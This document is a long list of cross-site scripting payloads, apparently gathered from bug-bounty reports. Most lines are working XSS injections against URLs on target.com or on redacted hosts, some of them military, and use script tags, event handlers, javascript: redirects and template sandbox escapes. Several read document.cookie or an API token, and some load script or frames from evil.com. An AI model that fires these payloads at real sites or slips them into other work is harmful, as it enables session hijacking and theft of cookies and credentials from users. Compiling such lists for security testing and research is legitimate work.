+http://target.com/admin/userlog-index.php?advertiserId=0&publisherId=0&period_preset=all_events%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E&period_start=&period_end=&setPerPage=10
+http://target.com/community/daniel?citySource=javascript:alert(%27XSSED%27
+http://target.com/community?return_url=javascript:alert(1
+http://target.com/define.php?term=Lol%3C/script%3E%3Csvg%20onload=confirm%28document.domain%29%3E
+http://target.com/files/glidownload/verify.asp?version=AC12%27%3E%3Cimg%20src=v%20onerror=alert(document.domain
+http://target.com/gallery/iT5l7%22%3E%3Cimg%20src=x%20onerror=alert(1
+http://target.com/newswire/tags#/?tags=\%2e%2e\%2e%2e\%2e%2e\comments_dal\users\getGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f
+http://target.com/sandbox/express/admin.php?/cp/members/bans&search=&sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
+http://target.com/search/dev?q=<svg
+http://target.com/search/suggest/q/xss<img%20src=x%20onerror=alert()>1337
+http://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://target.com/swf/photo_uploader_lite.swf?h=h?&onMouseOver=document.write(window.location.hash.substr(1))#<script>alert(document.domain)</script>
+http://target.com/user/%22%3E%3Cimg%20src=x%20onerror=alert(1
+http://target.com/user/phoenixrachel%22%3E%3Cimg%20src=x%20onerror=alert(1
+http://target.com/widget/386360/?t=[url=evil.com:/onclick=%27alert(document.domain
+http://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27http://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
+http://███/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.location
+http://████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
+http://█████.target.com/&quot;&gt;&lt;img+src=z+onerror=console.log(
+http://█████/?██████=%27;}alert(%22chron0x%22);%20function%20clickit(){//
+http://██████.target.com/"><img+src=z+onerror=console.log(
+http://████████.target.com/&amp;quot;&amp;gt;&amp;lt;img+src=z+onerror=console.log(
+http://█████████/scripts/ctredirector.dll//?@_FILEhttp://target.com/%3Csvg/onload=confirm(document.cookie
+https://102.176.160.119:10443/remote/error?errmsg=--%3E%3Cscript%3Ealert(document.domain
+https://<iframe src="https://target.com/[ID_OF_TARGET]?tab=public_profile">
+https://[YOUR-SHOP].target.com/admin/marketing/reports/[MARKETING-CAMPAIGN-ID]?return_page_pathname=javascript:alert('xss')&return_page_title=Marketing%20overview
+https://localhost/-/jira_connect/users?return_to=javascript:alert(location)
+https://target.com/#<img src=x onerror=alert('XSS')>
+https://target.com/#<img/src=
+https://target.com/'-alert(document.domain)-'
+https://target.com//x:1/:///%01javascript:alert(document.cookie)/
+https://target.com/1player/tags/1.3/players/video-js/video-js.swf?readyFunction=alert(%27Hello%27
+https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27
+https://target.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(document.domain
+https://target.com/<svg/onload=alert(document.domain
+https://target.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
+https://target.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
+https://target.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
+https://target.com/?dest=javascript:alert(document.domain)
+https://target.com/?redirect=javascript:prompt(document.domain
+https://target.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase
+https://target.com/?s=%26%23123%3B%26%23123%3Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D&post_type=product
+https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=3572
+https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=<theme_ID>
+https://target.com/?txHash=qwqwq%3C%20SRC=%22jav&#x0D;ascript:alert(0
+https://target.com/account/signin?ReturnUrl=%09Jav%09ascript:alert(document.domain
+https://target.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529
+https://target.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
+https://target.com/admin/menus/new                                             "><img src="x" onerror="alert(document.cookie)">
+https://target.com/admin/su/?Error=%3cscript%3ealert(document.domain
+https://target.com/album/image/679/1139%22%3E%3Ch1%3ESurprise!%3Cimg%20src=0%20onerror=%22alert(document.domain
+https://target.com/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain
+https://target.com/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert\(document.domain\
+https://target.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain
+https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E
+https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E
+https://target.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E
+https://target.com/avatar/█████████.png?;'onload=alert(document.domain)>
+https://target.com/blogsearch?q=OnMoUsEoVeR=prompt(/hacked/)//
+https://target.com/bugbounty/webcachedeception.php?url=https://evil.com/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
+https://target.com/buynow-webkhaleesio2-ppg?lang=fr&x-prepay=xxxxxxxx'"><svg/onload=alert(document.cookie)>
+https://target.com/card.xq?id=%3C/title%3E%3Cscript%3Ealert(document.domain
+https://target.com/careers?lever-#aaa"><script src="https://evil.com/index.php/form/getForm?callback=alert"></script>
+https://target.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie
+https://target.com/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
+https://target.com/combine/;%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1
+https://target.com/community/marketplace/%22;alert(0
+https://target.com/cookie.php?cookie=document.cookie
+https://target.com/creator/auth/login?creator_redirect=javascript:alert(document.domain)
+https://target.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz
+https://target.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
+https://target.com/email/unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E
+https://target.com/en-us/profile/login.html?-back=\u0022\u003e\u003cimg+src=x+onerror=alert(1)\u003e\u003cx+y=\u0022
+https://target.com/en/home/tttttt</script><script>alert(0)</script>                                                                                     </script><script>alert(0)</script>
+https://target.com/en/jobs-search.html?location=1%22%3E%3Cscript%20src=//evil.com/tpm?tpm_cb=alert%28document.domain%29%3E//
+https://target.com/ext/jquery/dist/jquery.min.js?c=%22%3E%0D%0A%0D%0A%3Cx%20%27=%22foo%22%3E%3Cx%20foo=%27%3E%3Cimg%20src=x%20onerror=javascript:alert(
+https://target.com/form.html?uid=1&p=%27%20onmouseover=alert(document.domain
+https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.cookie
+https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain
+https://target.com/intent/favorite/complete?tweet_id=572435913768366080&already_favorited=false&original_referer=javascript:alert%281%29;
+https://target.com/jwplayer/player.swf?playerready=alert(document.domain
+https://target.com/landings/123.1/index.php?affid=zzb_175.331184.1530814850.33.zzb&trt=29_5tse3g%22%3E%3Cscript%3Ealert(document.domain
+https://target.com/login!input.jspa?referer=javascript:alert(document.domain
+https://target.com/login/?dest=javascript:alert(document.domain
+https://target.com/markets?utm_source=INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+https://target.com/messages/referrals/contacts/                                                           [[constructor.constructor('alert(1)')()]]
+https://target.com/mk/api/send-event?rid=%3C/script%3E%3Cscript%3Ealert(document.cookie
+https://target.com/musicstore?section=%27-alert(document.domain
+https://target.com/my_reports/api/v1/document%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie
+https://target.com/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1
+https://target.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
+https://target.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain
+https://target.com/php/fb_login_pass_reset?type=%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E
+https://target.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E
+https://target.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//evil.com/%3f
+https://target.com/php/liveSuggest.php?type=keyword&search_bar=1&q=ad&online_ordering=&search_city_id=5&entity_id=confirm(1
+https://target.com/portal/licensing-check?redirect_url=javascript:alert(document.domain
+https://target.com/portal/login-callback?redirectUrl=javascript:alert(document.domain
+https://target.com/product-category/apparel/?subcat=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
+https://target.com/products/c-of-change?shop=evil.com&style=h%20.product-buy-button{x:expression(alert(1
+https://target.com/redirect?url=javascript://%250Aalert(document.cookie
+https://target.com/redirect?url=javascript://%250Aalert(document.domain
+https://target.com/redirect?url=javascript://%250Aalert(document.location=
+https://target.com/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain
+https://target.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
+https://target.com/sankt-peterburg?verifyUserLocation=1#login?next=javascript:alert(
+https://target.com/search/{{constructor.constructor('alert(document.domain)')()}}
+https://target.com/search?search=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://target.com/search?search=%3Cscript%3Ealert(document.domain
+https://target.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://evil.com/%0a<body
+https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.cookie
+https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.domain
+https://target.com/services/partners?signup=confirm(document.domain
+https://target.com/shard/s1/client/snv?view=after-save-note&ionUrl=javascript:alert(document.cookie
+https://target.com/shop/paymentmethod/hkjhk%2522onclick=%2522confirm(/-/g+this.ownerDocument.domain
+https://target.com/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain
+https://target.com/signup/global/?place_id=ChIJPaCKh-tmA4wR7JEkNDrNDSU&location=Carolina<script
+https://target.com/sock/1/0/0/0/htmlfile?c=alert(
+https://target.com/start/account/user?variationName=free&redirect_to=javascript:alert(document.domain
+https://target.com/student/award/███?referer=javascript:alert(document.domain)
+https://target.com/student/award/████████?referer=javascript:alert(document.domain)
+https://target.com/swf/storage.swf?onload=alert(1)
+https://target.com/themes/filter/blog/type/%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E
+https://target.com/unsubscribe?email=kolabro</script><script>alert(document.domain)</script>
+https://target.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1
+https://target.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1
+https://target.com/videos/pop-up-shop?x=');alert(1)//
+https://target.com/web/sign-inhttps://target.com/javascript:alert(1
+https://target.com/website/?currency=%3C/title%3E%3C/script/%22-alert%280%29-%22--%3E%22%3E%3Csvg/onload=prompt%28document.domain%29%3E
+https://target.com/webview/v1/refresh-jwt?redirect=%22%3E%3Cimg%20src=faw%20onerror=alert(1
+https://target.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1
+https://target.com/webview/v1?phone=████████&token=██████████&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22
+https://target.com/widgets/share/tool?url=https%3A%2F%2Fevil2.com%2F&title=%3Ca%20href=%22javascript:alert(document.domain);//http://evil.com/%22%3Eclick%20me%3C/a%3E&selection=click%20in%20the%20link%20after%20reblog&shareSource=chrome_extension
+https://target.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie
+https://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
+https://target.com:443/mod/lti/auth.php?redirect_uri=javascript:alert(document.domain
+https://www.███.mil/?code=%27;prompt(%27XSS%27
+https://www.████frame.html#javascript:alert(document.domain
+https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
+https://www.████████.mil/?code=%27;prompt(%27XSS%27
+https://███/help-leave/help/index.htm#rhsearch=%3Cmarquee%20loop=1%20onfinish=alert(document.domain)%3Etest%3C%2Fmarquee%3E&ux=search
+https://███/███=%3Cscript%3Ealert(document.domain
+https://███="><script>alert(1)</script>
+https://████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
+https://█████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
+https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fevil.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
+https://█████/sec.html?redirect=javascript:alert(document.cookie
+https://█████/████&url=http%3a%2f%2ftarget.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E
+https://█████/████=javascript:alert(document.domain)
+https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
+https://█████/██████████<img%20src=x%20onerror=alert()>
+https://█████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
+https://██████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
+https://██████/?s=%27%3E%3Cscript%3Ealert(document.domain
+https://██████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
+https://██████/images.ashx?loc=%3C/div%3E%3Cimg%20src=%22target.com%22%20onerror=alert(%22TestingXSS%22
+https://██████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
+https://██████/users/user?error=<img src='x' onerror="alert(document.domain)">
+https://██████/███<img%20src=x%20onerror=alert()>
+https://██████:443/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
+https://███████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
+https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert(
+https://███████/users/user?error=<img src='x' onerror="alert(document.domain)">
+https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
+https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
+https://████████%3Csvg%20onload=alert%28document.cookie%29%3E?mimeType=text/html
+https://████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
+https://████████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
+https://████████/en/embeddedAuthRedirect.html?auth=javascript:alert(%22xElkomy%22
+https://████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
+https://████████/portal/pls/portal/PORTAL.wwexp_render.show_tree?p_otype=SITEMAP&p_request=open&p_minusimage=&p_plusimage=&p_headerimage=%2Fimages%2Fbhfind2.gif&p_show_banner=NO&p_show_cancel=NO&p_open_item=1.FOLDER.FOLDERMAP.1_0&p_open_items=0.SITEMAP.FOLDERMAP.0_-1&p_domain=wwc&p_sub_domain=FOLDERMAP&p_title=Browse+Pages</title><script/src='https://target.com/hta3.js'></script>&p_datasource_data=document.SEARCH60_PAGESEARCH_362193163.ft&p_datasource_data=document.SEARCH60_PAGESEARCH_36219
+https://████████/██████=javascript:alert(document.domain)
+https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
+https://████████/██████onload=%22prompt(1
+https://████████/█████████████████=%22%3E%3Csvg/onload=alert(1
+https://████████/████████████████████████=%22%3E%3Csvg/onload=alert(1
+https://█████████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
+https://█████████/Pages/default.aspx?FollowSite=0&SiteName=%27-confirm(%27XSSALERT%27
+https://█████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
+https://█████████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
+https://█████████/sec.html?redirect=javascript:alert(1
+https://█████████/█████████CE399%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(document.domain
+https://██████████%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://██████████/landpower/resources.aspx?Directory=/20/&ParentID=27&CurrentFolder=%3Cimg%20src%20onerror=alert(domain
+https://██████████/mission.php?content=crew&flight=DOC&line=Right&missionDate=19-Mar-19&ped=%3Csvg+onload=alert(%27jarvis7%27
+https://██████████/███onload=%22prompt(1)
+https://██████████/██████/logout?service=javascript:alert(1
+https://██████████/██████=%3C/script%3E%3Cscript%3Ealert(document.domain
+https://██████████/███████████=███████"><details%00open%00ontoggle=alert()>
+https://███████████████%3CSvg%20OnLoad=alert(1
+https://████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
+https://█████████████████/auth/logout.jsx?home=javascript:(alert(%27XSS%20Success!%27))()
+https://██████████████████%3CSvg%20OnLoad=alert(1
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+invalid@example.org REJECT 5.1.1 <img src="" onerror="alert('hackerone!')" />
+javascripT:*.target.com
+javascripT://
+javascripT://*.target.com
+javascripT://https://target.com%0aalert(1);//https://target.com
+javascripT://target.com
+javascripT:target.com
+javascript%3A%2F%2F"><script>alert(document.domain)</script>
+javascript&#3A;alert(1);
+javascript:
+javascript: window.open(&quot;https://target.com/intent/tweet?text=Answer on @Quora by @User to Question? http://evil.com/nnnn&quot;, &quot;Share Answer to Twitter&quot;, &quot;width=600, height=250&quot;)
+javascript://%0aalert(1)
+javascript://%0aalert(document.cookie)
+javascript://%250Aalert(document.location="https://target.com",document.location="https://evil.com")
+javascript://alert(document.domain);%2f%2f@
+javascript:STRING_EXPECTED_REMOVING
+javascript:alert
+javascript:alert("Current user its API token: " + window.gon.api_token);
+javascript:alert('You are pwned!')
+javascript:alert()
+javascript:alert(1)
+javascript:alert(1)//https://target.com
+javascript:alert(document.cookie)
+javascript:alert(document.cookie)//https://target.com/
+javascript:alert(document.domain)
+javascript:alert(document.domain) //http://target.com/uploads/pwned.jpg
+javascript:alert(document.domain);
+javascript:alert(document.domain);//https://evil.com/
+javascript:alert(window.opener.document.location)
+javascript:confirm(document.domain)
+javascript:eval%2528unescape%2528location.hash.slice%25281%2529%2529%2529
+line 1309 : n.html('"<u>' + t + '</u>"')                                                                   https://www.<img src=x onerror='alert()'>
+lll"></script><script>alert('xss');</script>
+locals" onclick=alert('XSS!') "'>
+location='javascript:\x3csvg\x20onload=alert\x28document.domain\x29\x3e'
+location='javascript:alert\x28\x29'
+luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com
+nextcloud/index.php/apps/gallery/#%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29//%00
+o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
+onerror="alert(1)"
+payload i use = "><img src=x onerror=prompt(123)>
+pid=123&issue_type=1&base_url=javascript://alert(1)%3B@&summary={{title}}&description={{details_truncated}}+{{1+1}}+#{1+1}&labels=HackerOne&assignee=&custom=test=1
+prompt(document.domain, document.cookie)
+prompt(document.domain,document.cookie)
+referer=javascript:alert(document.cookie);
+requires_python='"><script>alert(1)</script>'
+sample-csv-sku.csv"-alert(document.domain)-"
+select <svg onload=alert(1)>
+simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
+something<script>alert('xss');</script>
+svg/onload=alert(1)>
+target.com/badges?hostname=hostname" type="text/javascript"> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
+target.com/heh<script>alert(1)
+target.com/international/live/5/5/1})}});alert(document.cookie);(test=>{{({<!--
+test <script>alert(document.domain)</script>
+test'"><img src=x onerror=alert(document.location)>.txt
+then create a ticket in Jira with summary containing payload e.g. ```test<script>alert(1)</script>
+touch '"><img src=x onerror=alert("xss")>.jpg'
+urban dictionary "><img src=x<
+url = javascript:alert('XSS');
+url=JAVASCRIPT:some-payload
+user1"onmouseover="alert(1);remove()"style="position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px"
+window.open("javascript:window.opener.alert('bored-engineer')")
+x[javascript:alert(1)]
+your_email@gmail.com"><img src=x onerror=alert(1);>
+{"</script><script>alert(1)//"=>"xss"}
+{"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":1}
+{"action":"mobile","redirect_to":"test\"><script>alert(document.domain)</script>"}
+{"colours":{},"pd2":{"cranium":"cranium_midstraightmale","forehead":"forehead_standard","hair_back":"hair_back_midstraightmale","hair_front":"hair_front_midstraightmale","hairbottom":"hairbottom_blank","detail_L2_L":"_blank","detail_L2_R":"_blank","jaw":"<svg onload=alert(document.domain)>","beard":"_blank","stachin":"_blank","stachout":"_blank"},"body":{},"style":1}
+{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"_cc":"asdf\"}}</script><script>alert(1)</script>"},"useragent":{"ua":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36","browser":
+{"enabled":true,"sid":"bbc661585c424072","url":"target.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
+{"html":"<script>alert(document.domain)</script>"}
+{"id":"4","activationDate":"<script>alert(1)</script>"}
+{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}
+{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://target.com/test%0aalert(document.domain)", "prf_reward": "10"}
+{"type":"rocket","event":"rocket","payload":{"mm":[["fi",[],3,{"type":"unfurl","originalFragment":{"_bindings":{"attach":[[]],"mutation:post":[[]],"attached":[[]],"detach":[[]],"detached":[[]]},"_bindingLock":0,"_customData":[],"_data":{"type":"p","text":"javascript:alert(document.domain%29","tabbing":0,"links":{"javascript:alert(\"XSS\"%29":[0,22]},"formats":[]},"_dom":null,"_mutable":{"_lock":0},"_mutableGuard":{"_lock":0},"_parent":null,"_text":"javascript:alert(\"XSS\"%29","_tabbing":0,"_lin
+{<img src>}[link]
+{meme, src= http://dummy//onerror=eval(prompt(1))// }
+{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
+{{constructor.constructor(&#39;alert(document.domain)&#39;)()}}
+†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€
+€{{amount}} "><img src=x onerror=prompt(document.domain)>
+████████"document.cookie")>
+██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E
+██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E
